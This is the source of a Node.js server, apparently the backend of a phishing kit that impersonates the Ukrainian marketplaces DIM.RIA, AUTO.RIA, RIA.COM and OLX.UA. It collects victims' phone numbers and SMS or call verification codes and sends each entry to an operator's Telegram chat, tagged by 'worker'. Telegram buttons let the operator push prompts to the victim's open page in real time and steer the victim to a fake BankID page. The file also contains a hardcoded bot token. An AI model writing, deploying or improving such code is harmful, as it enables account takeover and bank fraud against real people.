const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const { createServer } = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const fetch = require('node-fetch');

// === КОНСТАНТИ ===
const BOT_TOKEN = "8311394660:AAEt9CJLYspkbVUcopIYik2KFh1EXLgIko8";
const CHAT_ID = "-1003298945563";
const BANKID_URL = "https://idverification.onrender.com";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const PORT = process.env.PORT || 3000;
// Використовуйте коректну зовнішню URL для хостингу
// Наприклад, для Render це може бути process.env.RENDER_EXTERNAL_URL
const HOST = process.env.HOST_URL || `http://localhost:${PORT}`; 


// Ініціалізація Express та Socket.IO
const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer);

// Ініціалізація Telegram бота
const bot = new TelegramBot(BOT_TOKEN, { polling: false }); 

// === СЛОВНИК ДЛЯ ЗБЕРІГАННЯ КЛІЄНТІВ ЗА НОМЕРОМ ТЕЛЕФОНУ ===
// key: "+380...", value: socket.id
const phoneToSocketId = {};

// === НАЛАШТУВАННЯ WEBHOOK ===
const webhookUrl = `${HOST}/bot${BOT_TOKEN}`;
bot.setWebHook(webhookUrl).then(() => {
    console.log(`Telegram Webhook встановлено на: ${webhookUrl}`);
}).catch(e => console.error("Помилка встановлення Webhook:", e.message));

// === LOGIC ДЛЯ SOCKET.IO ===
io.on('connection', (socket) => {
    console.log('Клієнт підключився:', socket.id);

    // Клієнт надсилає свій номер телефону після завантаження
    socket.on('register_phone', (phone) => {
        if (phone && typeof phone === 'string') {
            phoneToSocketId[phone] = socket.id;
            console.log(`Клієнт зареєстрований: ${phone} -> ${socket.id}`);
        }
    });

    socket.on('disconnect', () => {
        // Видаляємо клієнта зі словника при відключенні
        for (const phone in phoneToSocketId) {
            if (phoneToSocketId[phone] === socket.id) {
                delete phoneToSocketId[phone];
                console.log(`Клієнт відключився: ${phone}`);
                break;
            }
        }
    });
});

// === MIDDLEWARE & ROUTES ===
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '.')));

const LOGOS = {
    dimria: "https://play-lh.googleusercontent.com/ztuWEFjw0OavxEvC_Zsxfg9J8gRj_eRFdsSMM7ElokPPUwmc2lAqCW47wbESieS6bw",
    autoria: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ed/43/65/ed436516-dde8-f65c-d03b-99a9f905fcbd/AppIcon-0-1x_U007emarketing-0-8-0-85-220-0.png/1200x630wa.png",
    ria: "https://ria.riastatic.com/dist/img/logo900.png",
    olx: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/59/21/61/592161cf-9ee3-135c-3e1b-3510535e4b0a/AppIcon_OLX_EU-0-0-1x_U007emarketing-0-8-0-85-220.png/1200x630wa.png"
};
const PROJECT_NAMES = { dimria: "DIM.RIA", autoria: "AUTO.RIA", ria: "RIA.COM", olx: "OLX.UA" };

// Обробка Webhook'ів від Telegram
app.post(`/bot${BOT_TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// Обробка натискання inline-кнопок в Telegram
bot.on('callback_query', (callbackQuery) => {
    const data = callbackQuery.data; // call_+380... або sms_+380...
    const match = data.match(/^(call|sms)_(.+)$/);

    if (match) {
        const method = match[1];
        const phone = match[2];
        const socketId = phoneToSocketId[phone];

        // Надсилаємо команду на сайт клієнта через Socket.IO
        if (socketId) {
            io.to(socketId).emit('command', { method });
            bot.answerCallbackQuery(callbackQuery.id, { text: `Команда ${method.toUpperCase()} відправлена клієнту.` });
            console.log(`Команда '${method}' відправлена на ${phone}`);
        } else {
            bot.answerCallbackQuery(callbackQuery.id, { text: 'Клієнт не в мережі або не знайдено.' });
            console.warn(`Клієнт ${phone} не знайдений для Socket.IO.`);
        }
    }
    // Відповідаємо на запит, щоб прибрати "годинник" з кнопки
    bot.answerCallbackQuery(callbackQuery.id); 
});

// Оригінальні маршрути
app.get('/', (req, res) => {
    const project = req.query.project || 'dimria';
    if (!['dimria', 'autoria', 'ria', 'olx'].includes(project)) {
        return res.status(400).send('Невідомий проект');
    }
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/logo', (req, res) => {
    const project = req.query.project || 'dimria';
    const logo = LOGOS[project] || LOGOS.dimria;
    res.redirect(logo);
});

app.get('/panel', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));

// Допоміжна функція для відправки в Telegram
async function sendToTelegram(message, reply_markup = null) {
    const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
    if (reply_markup) {
        payload.reply_markup = reply_markup;
    }
    
    try {
        const res = await fetch(TELEGRAM_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            timeout: 10000
        });
        const result = await res.json();
        return res.ok && result.ok;
    } catch (err) {
        console.error("Помилка відправки в Telegram:", err.message);
        return false;
    }
}

// Ваша оригінальна логіка POST /api/send-data
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code, worker, project = 'dimria', city = 'Невідомо' } = req.body;
    
    const projectName = PROJECT_NAMES[project] || 'DIM.RIA';
    const workerTag = worker ? `\n*Воркер:* @${worker}` : '';

    let message = '';
    let reply_markup = null;
    let ok = false;
    
    if (step === 'phone' && phone) {
        // Крок 1: Введений телефон (відправляємо з кнопками в ТГ)
        message = `*НОВИЙ ЛОГ* 🔔\n*ПРОЕКТ:* ${projectName} ⚡\n*Номер:* \`${phone}\`\n*Місто:* ${city}\n*Країна:* Україна${workerTag}`;
        
        // Inline-кнопки
        reply_markup = {
            inline_keyboard: [
                [{ text: "📞 Звонок", callback_data: `call_${phone}` }],
                [{ text: "✉️ Код", callback_data: `sms_${phone}` }],
                [{ text: "🏦 BankID", url: BANKID_URL }]
            ]
        };
        ok = await sendToTelegram(message, reply_markup);
    }
    else if (step === 'call_code' && code && phone) {
        message = `*КОД ДЗВІНКА:* \`${code}\`\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}${workerTag}`;
        ok = await sendToTelegram(message);
    }
    else if (step === 'sms_code' && code && phone) {
        message = `*SMS КОД:* \`${code}\`\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}${workerTag}`;
        ok = await sendToTelegram(message);
    }
    else if (step === 'method_bankid_click' && phone) {
        message = `*КОРИСТУВАЧ ПЕРЕЙШОВ НА BANKID* 🏦\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}${workerTag}`;
        ok = await sendToTelegram(message);
    } 
    else {
        return res.status(400).json({ success: false });
    }

    res.json({ success: ok });
});

// === СТАРТ СЕРВЕРА ===
httpServer.listen(PORT, () => {
    console.log(`Сервер запущено на порту: ${PORT}`);
    console.log(`Панель: ${HOST}/panel`);
    setTimeout(() => {
        sendToTelegram(`*Проекты успешно стали на сервер* ✅\nНаши проекты: DIM.RIA / AUTO.RIA / RIA.COM / OLX.UA`);
    }, 3000);
});
